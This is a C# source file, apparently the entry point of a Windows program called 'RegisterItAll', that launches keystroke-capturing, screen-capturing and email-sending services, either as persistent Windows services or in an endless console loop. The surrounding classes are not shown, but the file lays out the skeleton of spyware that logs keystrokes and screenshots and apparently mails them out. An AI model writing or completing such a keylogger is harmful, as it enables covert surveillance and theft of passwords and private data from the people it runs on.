using RegisterItAll.Services;
using RegisterItAll.Services.Base;
using System.Linq;
using System.ServiceProcess;

namespace RegisterItAll
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            ExecutableAsConsoleApplicationService[] servicesToRun = new ExecutableAsConsoleApplicationService[]
            {
                new EmailSenderService(),
                new KeystrokesCapturerService(),
                new ScreenCapturerService(),
            };

            if (args.ToList().Contains("-RunAsConsoleApplication"))
            {
                foreach (ExecutableAsConsoleApplicationService service in servicesToRun)
                {
                    service.ExecuteAsConsoleApplication(args);
                }

                while (true) { }
            }
            else
            {
                ServiceBase.Run(servicesToRun);
            }
        }
    }
}